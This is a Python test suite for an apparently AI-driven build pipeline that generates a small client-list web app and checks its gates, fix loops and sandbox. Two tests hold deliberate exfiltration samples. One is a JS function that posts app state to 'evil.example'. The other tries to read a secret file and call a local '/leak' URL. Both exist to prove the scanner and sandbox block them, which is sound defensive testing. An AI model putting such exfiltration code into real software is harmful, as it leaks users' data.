"""Smoke tests for Phase 3 (Build). A scripted fake model stands in for gpt-oss; the sandbox and Node's test
runner are real, so Node.js 22+ must be installed.

Run: python -m unittest discover -s phase-3-build/tests
"""

from __future__ import annotations

import json
import sys
import tempfile
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent))
sys.path.insert(0, str(Path(__file__).resolve().parents[2]))

import sandbox  # noqa: E402
from agents.product_manager import drop_stories, normalise, validate_spec  # noqa: E402
from common.llm import LLMResult, extract_code  # noqa: E402
from gates import build_gate  # noqa: E402
from orchestrator import BuildPipeline  # noqa: E402

SPEC = {
    "buildable": True, "product_name": "Client book", "summary": "Keep a list of grooming clients",
    "data_model": "{ clients: [{id, name}] }",
    "api": [{"name": "createState", "signature": "createState() -> state"},
            {"name": "addClient", "signature": "addClient(state, {id, name}) -> state"},
            {"name": "removeClient", "signature": "removeClient(state, id) -> state"}],
    "stories": [
        {"id": "S1", "story": "As a groomer I can add clients",
         "acceptance_criteria": [{"id": "AC1", "function": "addClient", "text": "adds a client"},
                                 {"id": "AC2", "function": "addClient", "text": "throws on empty name"}]},
        {"id": "S2", "story": "As a groomer I can remove clients",
         "acceptance_criteria": [{"id": "AC3", "function": "removeClient", "text": "removes by id"}]},
    ],
    "out_of_scope": ["SMS reminders"],
}

TESTS = """import { test } from 'node:test';
import assert from 'node:assert/strict';
import { createState, addClient, removeClient } from './logic.js';

test('AC1: adds a client', () => {
  const s0 = createState();
  const s = addClient(s0, { id: 'c1', name: 'Ana' });
  assert.equal(s.clients.length, 1);
  assert.equal(s0.clients.length, 0);
});
test('AC2: throws on empty name', () => {
  assert.throws(() => addClient(createState(), { id: 'c1', name: '' }));
});
test('AC3: removes by id', () => {
  const s = removeClient(addClient(createState(), { id: 'c1', name: 'Ana' }), 'c1');
  assert.equal(s.clients.length, 0);
});
"""

TESTS_S1_ONLY = TESTS.split("test('AC3")[0].replace(", removeClient", "")

GOOD = """export function createState() { return { clients: [] }; }
export function addClient(state, c) {
  if (!c.name) throw new Error('Name is required');
  return { ...state, clients: [...state.clients, { id: c.id, name: c.name }] };
}
export function removeClient(state, id) {
  return { ...state, clients: state.clients.filter((c) => c.id !== id) };
}
"""
GOOD_S1_ONLY = GOOD.split("export function removeClient")[0]
NO_VALIDATION = GOOD.replace("  if (!c.name) throw new Error('Name is required');\n", "")
BROKEN_REMOVE = GOOD.replace("c.id !== id", "true")

UI = """<!doctype html><html><head><meta charset="utf-8"><title>Client book</title></head><body>
<p>Early version (MVP). Your data stays in this browser.</p><ul id="list"></ul>
<script type="module">
import { createState, addClient, removeClient } from './logic.js';
let state = createState();
try { state = JSON.parse(localStorage.getItem('s')) || state; } catch {}
function save() { try { localStorage.setItem('s', JSON.stringify(state)); } catch {} }
window.add = (name) => { state = addClient(state, { id: crypto.randomUUID(), name }); save(); };
window.remove = (id) => { state = removeClient(state, id); save(); };
</script></body></html>
"""

DOCS = """# Client book: user guide
## What it does
Keeps a list of your clients.
## Getting started
Open the app in your browser.
## How to add a client
1. Type a name. 2. Press Add.
## Your data
Stored only in this browser.
## What it does not do yet
SMS reminders.
## Questions
Ask the person who shared it with you.
"""


class FakeLLM:
    model = "fake-gpt-oss"

    def __init__(self, replies):
        self.replies = list(replies)
        self.calls = []

    def _next(self, user):
        self.calls.append(user)
        if not self.replies:
            raise AssertionError("model called more times than scripted")
        return self.replies.pop(0)

    def chat_json(self, system, user, required_keys=()):
        return LLMResult(self._next(user), self.model, 10, 5)

    def chat_code(self, system, user, langs):
        return self._next(user), LLMResult({}, self.model, 10, 5)


class Founder:
    def __init__(self, answers):
        self.answers = list(answers)

    def __call__(self, prompt=""):
        if not self.answers:
            raise AssertionError(f"Unexpected extra prompt: {prompt!r}")
        return self.answers.pop(0)


class PipelineTest(unittest.TestCase):
    def setUp(self):
        self.tmp = Path(tempfile.mkdtemp())
        self.out = []
        (self.tmp / "outputs").mkdir()
        (self.tmp / "outputs" / "phase2_step4_handoff.json").write_text(json.dumps(
            {"brief": {"idea": "x"}, "canvas": {"solution": ["client list"]}, "evidence": {"signups": 120}}))

    def run_build(self, replies, answers, fix_attempts=3):
        self.llm = FakeLLM(replies)
        p = BuildPipeline(self.llm, input_fn=Founder(answers), output_fn=self.out.append,
                          log_path=self.tmp / "log.json", outputs_dir=self.tmp / "outputs",
                          runtime_dir=self.tmp / "runtime", fix_attempts=fix_attempts)
        result = p.build()
        self.assertEqual(self.llm.replies, [], "every scripted model reply should have been used")
        return result

    def log(self):
        return json.loads((self.tmp / "log.json").read_text())

    def test_happy_path_needs_founder_approval(self):
        result = self.run_build([SPEC, TESTS, GOOD, UI, DOCS], ["a", "a"])
        self.assertEqual(result["outcome"], "go")
        product = self.tmp / "runtime" / "product"
        self.assertEqual(sorted(p.name for p in product.iterdir()), ["README.md", "index.html", "logic.js", "logic.test.js"])
        handoff = json.loads((self.tmp / "outputs" / "phase3_step5_handoff.json").read_text())
        self.assertEqual(handoff["tests"]["failed"], [])
        self.assertEqual(handoff["canvas"], {"solution": ["client list"]})
        report = (self.tmp / "outputs" / "phase3_step2_test_report.md").read_text()
        self.assertIn("| AC3 | PASS |", report)
        decision = [e for e in self.log() if e["action"] == "build_gate_decision"][0]
        self.assertEqual((decision["outcome"], decision["approved_by"]), ("go", "founder"))

    def test_founder_can_stop_at_gate_and_no_handoff_is_written(self):
        result = self.run_build([SPEC, TESTS, GOOD, UI, DOCS], ["a", "s"])
        self.assertEqual(result["outcome"], "stop")
        self.assertFalse((self.tmp / "outputs" / "phase3_step5_handoff.json").exists())

    def test_coder_gets_failures_and_fixes_them(self):
        result = self.run_build([SPEC, TESTS, NO_VALIDATION, GOOD, UI, DOCS], ["a", "a"])
        self.assertEqual(result["outcome"], "go")
        self.assertIn("Failing tests", self.llm.calls[3])
        self.assertIn("AC2", self.llm.calls[3])
        runs = [e for e in self.log() if e["action"] == "run_tests"]
        self.assertEqual([r["failed"] for r in runs], [1, 0])

    def test_unfixable_story_can_be_cut_and_tests_are_rewritten(self):
        replies = [SPEC, TESTS, BROKEN_REMOVE, BROKEN_REMOVE, TESTS_S1_ONLY, GOOD_S1_ONLY, UI.replace(
            ", removeClient", "").replace("window.remove = (id) => { state = removeClient(state, id); save(); };\n", ""),
            DOCS]
        result = self.run_build(replies, ["a", "c", "a"], fix_attempts=2)
        self.assertEqual(result["outcome"], "go")
        self.assertEqual([s["id"] for s in result["spec"]["stories"]], ["S1"])
        self.assertIn("Cut from MVP by founder", (self.tmp / "outputs" / "phase3_step1_mvp_spec.md").read_text())

    def test_founder_can_stop_when_tests_keep_failing(self):
        result = self.run_build([SPEC, TESTS, BROKEN_REMOVE, BROKEN_REMOVE], ["a", "s"], fix_attempts=2)
        self.assertEqual(result["outcome"], "stop")
        self.assertFalse((self.tmp / "outputs" / "phase3_step5_handoff.json").exists())

    def test_unsafe_code_is_rejected_before_running(self):
        evil = GOOD + "export function sync(s) { return fetch('https://evil.example/' + JSON.stringify(s)); }\n"
        result = self.run_build([SPEC, TESTS, evil, GOOD, UI, DOCS], ["a", "a"])
        self.assertEqual(result["outcome"], "go")
        self.assertIn("network access", self.llm.calls[3])
        self.assertEqual(len([e for e in self.log() if e["action"] == "run_tests"]), 1)  # evil code never ran

    def test_tests_that_touch_the_filesystem_are_rejected(self):
        bad = "import fs from 'node:fs';\n" + TESTS
        self.run_build([SPEC, bad, TESTS, GOOD, UI, DOCS], ["a", "a"])
        self.assertIn("may only import", self.llm.calls[2])

    def test_ui_with_external_script_is_rejected(self):
        bad = UI.replace("<title>", '<script src="https://cdn.example.com/x.js"></script><title>')
        self.run_build([SPEC, TESTS, GOOD, bad, UI, DOCS], ["a", "a"])
        self.assertIn("external URL", self.llm.calls[4])

    def test_not_buildable_stops_without_approve_option(self):
        spec = {**SPEC, "buildable": False, "not_buildable_reason": "It is a video course"}
        result = self.run_build([spec], ["s", "b"])
        self.assertEqual(result["decision"], "back_to_validate")
        self.assertIn("**Outcome:** STOP", (self.tmp / "outputs" / "phase3_gate_tests.md").read_text())

    def test_missing_handoff_is_an_error(self):
        (self.tmp / "outputs" / "phase2_step4_handoff.json").unlink()
        with self.assertRaises(FileNotFoundError):
            self.run_build([], [])


class SandboxTest(unittest.TestCase):
    def setUp(self):
        self.dir = Path(tempfile.mkdtemp())

    def run_code(self, logic, tests, timeout=10):
        (self.dir / "logic.js").write_text(logic)
        (self.dir / "logic.test.js").write_text(tests)
        return sandbox.run_tests(self.dir, timeout=timeout)

    def test_permission_model_blocks_reads_writes_and_network(self):
        # Bypass the static scan on purpose to prove the runtime layer holds on its own.
        # A real local server is listening, so the fetch can only fail because of the sandbox.
        import threading
        from http.server import BaseHTTPRequestHandler, HTTPServer
        hits = []

        class H(BaseHTTPRequestHandler):
            def do_GET(self):
                hits.append(self.path)
                self.send_response(200)
                self.end_headers()

            def log_message(self, *a):
                pass

        server = HTTPServer(("127.0.0.1", 0), H)
        threading.Thread(target=server.serve_forever, daemon=True).start()
        outside = Path(tempfile.mkdtemp()) / "secret.txt"
        outside.write_text("secret")
        tests = f"""import {{ test }} from 'node:test';
import fs from 'node:fs';
test('read', () => {{ fs.readFileSync({json.dumps(str(outside))}); }});
test('write', () => {{ fs.writeFileSync('./x', 'x'); }});
test('net', async () => {{ await fetch('http://127.0.0.1:{server.server_port}/leak'); }});
test('control', () => {{ fs.readFileSync('./logic.js'); }});
"""
        try:
            run = self.run_code(GOOD, tests)
        finally:
            server.shutdown()
        self.assertEqual(sorted(run.failed), ["net", "read", "write"])
        self.assertEqual(run.passed, ["control"])  # reading inside the build folder is allowed
        self.assertEqual(hits, [])
        self.assertFalse((self.dir / "x").exists())

    def test_infinite_loop_times_out(self):
        run = self.run_code("export function createState() { while (true) {} }\n",
                            "import { test } from 'node:test';\nimport { createState } from './logic.js';\n"
                            "test('AC1: x', () => createState());\n", timeout=3)
        self.assertIn("did not finish", run.error)
        self.assertFalse(run.ok)

    def test_skipped_tests_do_not_count_as_ok(self):
        run = sandbox.parse_tap("ok 1 - AC1: a\nok 2 - AC2: b # SKIP\n# pass 1\n")
        self.assertEqual(run.skipped, 1)
        self.assertFalse(run.ok)

    def test_static_scans(self):
        names = ["createState", "addClient", "removeClient"]
        self.assertEqual(sandbox.scan_logic(GOOD, names), [])
        self.assertTrue(sandbox.scan_logic(GOOD + "const x = require('fs');\n", names))
        self.assertTrue(sandbox.scan_logic("export function createState() { return { t: Date.now() }; }", ["createState"]))
        self.assertIn("missing exports: removeClient", sandbox.scan_logic(GOOD_S1_ONLY, names))
        self.assertEqual(sandbox.scan_tests(TESTS, ["AC1", "AC2", "AC3"]), [])
        self.assertTrue(sandbox.scan_tests(TESTS, ["AC1", "AC2", "AC3", "AC4"]))
        self.assertEqual(sandbox.scan_ui(UI, names), [])
        self.assertTrue(sandbox.scan_ui(UI.replace("<p>", '<input type="password"><p>'), names))
        self.assertTrue(sandbox.scan_ui(UI.replace("<ul", '<form action="/pay"></form><ul'), names))
        self.assertEqual(sandbox.check_module_syntax(sandbox.module_scripts(UI)[0]), "")
        self.assertTrue(sandbox.check_module_syntax("let x = ;"))


class SpecAndGateTest(unittest.TestCase):
    def test_spec_validation(self):
        self.assertEqual(validate_spec(normalise(SPEC)), [])
        bad = normalise({**SPEC, "api": SPEC["api"][1:]})
        self.assertIn("api must include createState()", validate_spec(bad))
        bad = normalise({**SPEC, "stories": [{"id": "S1", "story": "x", "acceptance_criteria": [
            {"id": "AC1", "function": "deleteEverything", "text": "x"}]}]})
        self.assertTrue(any("not in the api" in p for p in validate_spec(bad)))

    def test_drop_story_removes_unused_functions(self):
        spec = drop_stories(normalise(SPEC), {"S2"})
        self.assertEqual([f["name"] for f in spec["api"]], ["createState", "addClient"])
        self.assertIn("Cut from MVP by founder: As a groomer I can remove clients", spec["out_of_scope"])

    def test_untested_criterion_blocks_go(self):
        run = sandbox.parse_tap("ok 1 - AC1: a\nok 2 - AC2: b\n")
        gate = build_gate(normalise(SPEC), run, {"logic.js": []}, True)
        self.assertEqual(gate.outcome, "repeat")
        self.assertIn("AC3 (untested)", gate.reasons[0])

    def test_extract_code(self):
        self.assertEqual(extract_code("Here:\n```js\nlet a = 1;\n```\nDone", ("js",)), "let a = 1;\n")
        self.assertEqual(extract_code("```html\n<p>x</p>\n```", ("html",)), "<p>x</p>\n")


if __name__ == "__main__":
    unittest.main()
